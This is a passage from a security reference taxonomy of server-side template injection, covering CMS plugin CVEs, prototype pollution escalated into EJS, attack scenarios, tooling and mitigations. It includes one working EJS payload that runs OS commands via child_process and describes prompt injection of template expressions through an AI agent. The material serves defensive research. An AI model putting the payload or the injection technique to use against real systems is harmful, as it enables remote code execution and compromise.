| **Indirect prompt injection → SSTI pivot** | Webpage contains hidden template expressions; when AI agent summarizes or processes the page, it incorporates the expressions into a template render call | AI agent with webpage-reading capability and template rendering in its output pipeline |

### §13-2. CMS and E-Commerce Plugin SSTI

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Grav CMS plugin injection** | CVE-2024-28116 — Grav's flat-file CMS uses Twig; admin-accessible template fields allow Twig SSTI leading to RCE | Authenticated admin access to Grav; Twig evaluation of user-editable template fields |
| **OFBiz `ProgramExport` endpoint** | Apache OFBiz's `/webtools/control/ProgramExport` endpoint executes Groovy scripts; OGNL/Groovy sandbox incomplete | CVE-2023-49070, CVE-2023-51467, CVE-2024-32113, CVE-2024-38856, CVE-2024-45195 chain — each patch bypass reveals same root cause |
| **WordPress template plugin injection** | WordPress plugins that offer "custom template" features sometimes pass shortcode content or widget text through PHP template engines | Plugin-specific; depends on whether eval or template engine is used for rendering |

### §13-3. Prototype Pollution → EJS SSTI

A specific escalation path where a prototype pollution vulnerability in a Node.js application is pivoted into SSTI via EJS template engine options.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **`outputFunctionName` pollution** | Prototype pollution sets `Object.prototype.outputFunctionName` to `_a;return global.process.mainModule.require('child_process').execSync('id');//`; EJS reads this as a template option | EJS `renderFile()` or `render()` called after prototype pollution; EJS reads options from `__proto__` |
| **`escape` function poisoning** | Polluting `Object.prototype.escape` to a function that executes OS commands; EJS uses this function for output escaping | EJS escape function poisoned via prototype chain before render call |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
| **Unauthenticated RCE** | Public endpoint, template parameter exposed, no auth required | §1-1, §4-4 (OGNL), §7-2 (CrushFTP) |
| **Authenticated admin RCE** | Admin panel with template customization features | §10-3 (template editor), §6-1 (Twig admin), §13-2 (Grav CMS) |
| **Blind SSTI via email/PDF sink** | Background template rendering, no HTTP reflection | §12-1, §12-2, §10-1 (stored) |
| **Second-order stored exploitation** | User data persisted, rendered later in admin/report view | §10-1, §12-2 |
| **WAF-protected target** | WAF in front of vulnerable app; payload must bypass signature inspection | §11-1, §11-2, §11-4 |
| **Java enterprise app RCE** | Spring Boot / Struts 2 / Apache OFBiz deployment | §4 (FreeMarker, OGNL, SpEL) |
| **Python/Flask microservice RCE** | Flask/Django application exposing `render_template_string()` | §3, §1-1, §11-1 |
| **Node.js SaaS application** | Express.js with Handlebars/EJS/Pug templates | §5, §13-3 |
| **Cloud/container escape** | SSTI yields shell → pivot to cloud metadata endpoint (SSRF via template) | §3-1 + SSRF chain |
| **Prototype pollution pivot** | Client-side prototype pollution escalated to server-side SSTI | §13-3 |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | CVSS / Bounty | Impact |
|---------------------|-----------|---------------|--------|
| §4-4 (OGNL injection) — unauthenticated | CVE-2023-22527 (Atlassian Confluence) | CVSS 10.0 | Unauthenticated RCE; exploited for cryptojacking (2024) and ELPACO-team ransomware (mid-2024); 62-hour dwell time before ransomware deployment |
| §7-2 (VFS SSTI — sandbox escape) | CVE-2024-4040 (CrushFTP) | CVSS Critical | Unauthenticated file read outside VFS; auth bypass to admin; RCE chain; exploited in the wild |
| §13-2 (OFBiz OGNL/Groovy chain) | CVE-2024-45195 (Apache OFBiz) | CVSS High | Unauthenticated RCE; patch bypass of CVE-2024-32113 + CVE-2024-36104 + CVE-2024-38856; CISA KEV |
| §13-2 (OFBiz OGNL — auth bypass) | CVE-2023-51467 (Apache OFBiz) | CVSS 9.8 | Authentication bypass + RCE via in-memory payload; surge in exploitation attempts Jan 2024 |
| §13-2 (Grav CMS Twig) | CVE-2024-28116 (Grav CMS) | High | Admin-authenticated SSTI in Twig via page/template fields; leads to OS RCE |
| §4-1 (FreeMarker SSTI — plugin) | CVE-2025-26865 (Apache OFBiz ecommerce plugin) | Critical | FreeMarker SSTI via ecommerce plugin; unauthenticated RCE in affected versions |
| §4-4 (OGNL/Groovy — OFBiz scrum) | CVE-2025-54466 (Apache OFBiz scrum plugin) | Critical | Code injection in scrum plugin; unauthenticated exploitation |
| §10-1 (Stored SSTI — OFBiz ecommerce) | CVE-2022-25813 (Apache OFBiz) | High | Stored SSTI via "Contact us" Subject field; triggered when party manager views communications |
| §2-2 (Double eval — Spring Boot Thymeleaf) | Pentest (modzero 2024) | N/A (private) | Referer header → Thymeleaf preprocessing double-eval → unauthenticated RCE on Spring Boot 3.3.4 |
| §4-3 (SpEL — Spring Boot error page) | Bug bounty writeup (2022, Akamai WAF bypass) | $5,000+ (estimated) | SpEL injection in error page parameter; WAF bypassed via encoding |
| §3-1 (MRO chain — Jinja2/Flask) | HackerOne: Uber rider.uber.com SSTI | $10,000+ bounty (historical reference) | Jinja2 SSTI in Flask app parameter; RCE demonstrated |
| §13-3 (Prototype pollution → EJS SSTI) | Multiple HackerOne reports (2023–2024) | $2,000–$15,000 | Prototype pollution escalated to RCE via EJS `outputFunctionName` option |

---

## Detection and Tooling Matrix

| Tool | Type | Target Scope | Core Technique |
|------|------|-------------|---------------|
| **SSTImap** (vladko312) | Offensive scanner | 15+ engines; Python, Ruby, PHP, Java, Node.js | Polyglot probing + interactive sandbox escape; based on Tplmap with interactive mode and blind injection verification |
| **Tplmap** (epinna) | Offensive scanner | 15+ template engines; eval()-like injections | Automated SSTI detection and OS shell extraction; sandbox break-out via MRO/reflection chains |
| **TInjA** (Hackmanit) | Offensive/research | 44 template engines; CSTI + SSTI | Novel polyglot generation; engine fingerprinting table covering 44 engines; both server and client-side |
| **Backslash Powered Scanner** (PortSwigger) | Burp extension | Reflected inputs | Differential analysis of server responses to syntax variations; detects non-obvious injection points |
| **tplmap Burp plugin** | Burp extension | Jinja2 / Python-focused | Integration with Burp Suite intruder/scanner for targeted SSTI probing |
| **Interactsh** (ProjectDiscovery) | OOB callback server | All blind injection types | DNS/HTTP/SMTP callback server for blind SSTI confirmation; open-source Burp Collaborator alternative |
| **Burp Collaborator** | OOB callback service | All blind injection types | DNS/HTTP/SMTP interaction logging for confirming blind SSTI via out-of-band channels |
| **WAFW00F** | WAF fingerprinting | Pre-attack recon | Identifies WAF vendor; informs which bypass category (§11-4) to prioritize |
| **Hackmanit Template Injection Playground** | Research/testing | 44 engines | Sandboxed browser environment for testing polyglot payloads against real engine instances |
| **Jinja2 SandboxedEnvironment** | Defensive | Python/Jinja2 | Restricts access to `__class__`, `__mro__`, dangerous dunder attributes; mitigates §3 attacks |
| **Twig Sandbox Extension** | Defensive | PHP/Twig | Whitelist-based function/method/property access control; mitigates §6-1 attacks |
| **ModSecurity + OWASP CRS** | Defensive WAF | Generic signature-based | Detects `{{`, `${`, `<%`, `__class__`, `__import__` patterns; bypassable via §11 techniques |
| **Semgrep / CodeQL SSTI rules** | SAST | Source code analysis | Identifies `render_template_string(userInput)`, `Razor.Parse(userInput)`, `ERB.new(input).result()` anti-patterns at CI/CD time |

---

## Summary: Core Principles

**The fundamental enabling property** of the entire SSTI mutation space is the architectural conflation of data and code. Template engines are Turing-complete interpreters — they were never designed to receive untrusted input as *source code*, only as *data bound to predefined variables*. The vulnerability class exists because developers, under time pressure or without security training, choose the convenient `render_template_string(f"Hello {name}")` path over the safe `render_template("template.html", name=name)` path. Every mutation in this taxonomy is a variant of the same substitution: the attacker inserts delimiters (`{{ }}`, `${ }`, `<%= %>`, `@( )`) that the engine treats as evaluation triggers rather than literal text. The diversity of mutations reflects the diversity of engines, contexts, defensive layers, and runtime environments — not fundamentally different vulnerability classes.

**Why incremental patches fail** is visible in the Apache OFBiz record: four separate CVEs (CVE-2024-32113, CVE-2024-36104, CVE-2024-38856, CVE-2024-45195) between May and September 2024 represent four iterations of the same patch — each fixing a path traversal variant that bypassed the previous fix — because the underlying issue (unauthenticated access to the `ProgramExport` template execution endpoint) was never eliminated, only obscured. Similarly, Jinja2's `SandboxedEnvironment` has been bypassed repeatedly because the sandbox restricts *attribute access* but cannot block the fundamental Python MRO, operator overloading, or format-string mechanisms that remain available in restricted contexts. Encoding bypasses (§11-1), filter bypasses (§11-2), and WAF evasion (§11-4) all exist because signature-based defenses model payloads as fixed strings rather than as syntactic structures.

**The structural solution** requires eliminating the code/data conflation at the framework level: (1) never pass user-controlled strings as template *source* — always pass them as template *parameters*; (2) prefer logic-less template engines (Mustache, Handlebars in non-helper mode) where the engine's evaluation capability is architecturally constrained; (3) apply SAST rules at CI/CD time to detect dangerous sink calls (`render_template_string`, `ERB.new().result()`, `Razor.Parse()`, `env.from_string()`) that receive user input; (4) for second-order injection surfaces (§10-1), apply sanitization at the point of storage rather than at the point of rendering; and (5) for Java enterprise environments with multi-layer rendering pipelines (Struts/OFBiz — §4-4), enforce the principle that OGNL expressions must never originate from HTTP request parameters at any point in the pipeline, regardless of authentication state.

---

## References

1. Kettle, J. (2015). *Server-Side Template Injection: RCE for the Modern Web App*. PortSwigger / Black Hat 2015.
2. Brumens (2025, March). *Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere*. YesWeHack / Ekoparty 2024.
3. Philippe, L. 'BitK' (2022, September). *Template Injection On Hardened Targets*. DEF CON 30.
4. Awali, M. (2024, November). *Template Engines Injection 101*. Medium / @0xAwali.
5. Korchagin, V. (2026, January). *Successful Errors: New Code Injection and SSTI Techniques*. PayloadsAllTheThings Reference.
6. Hildebrand, M. (2023, September). *Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning*. Hackmanit.
7. modzero (2024). *Exploiting SSTI in a Modern Spring Boot Application (3.3.4)*. modzero.com.
8. SCH Tech (2024). *Razor Pages SSTI & RCE*. schtech.co.uk.
9. Atlassian (2024, January). *CVE-2023-22527: Critical RCE Vulnerability in Confluence Data Center and Server*. CVSS 10.0.
10. CrushFTP (2024). *CVE-2024-4040: VFS Sandbox Escape / SSTI*. CVSS Critical.
11. Emmons, R. / Rapid7 (2024, September). *CVE-2024-45195: Apache OFBiz Unauthenticated RCE*.
12. Apache OFBiz Security (2025). *CVE-2025-26865: FreeMarker SSTI via ecommerce plugin*.
13. Notin, C. (2020). *Server-Side Template Injection in ASP.NET Razor*. clement.notin.org.
14. Oligo Security (2025). *Safe by Default or Vulnerable by Design: Golang SSTI*. oligo.security.
15. Check Point Research (2024). *Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities*.
16. Wallarm (2024). *CVE-2023-22527 Exploitation Analysis*.
17. GitHub Blog / Security (2023). *Bypassing OGNL Sandboxes for Fun and Charities*.
18. OWASP Foundation. *Testing for Server Side Template Injection (OTG-INPVAL-018)*.
19. swisskyrepo / PayloadsAllTheThings. *Server Side Template Injection* (maintained repository, accessed 2025).
20. HackTricks / book.hacktricks.xyz. *SSTI (Server Side Template Injection)* (maintained reference, accessed 2025).
21. arxiv.org (2024, May). *A Survey of the Overlooked Dangers of Template Engines* (arXiv:2405.01118).
22. YesWeHack (2025). *Bug Bounty Report 2025: SSTI/CSTI Hunter Tips from Top Hunters*.

---

*This document was created for defensive security research and vulnerability understanding purposes. All techniques described are documented in public security research, CVE disclosures, and bug bounty writeups.*
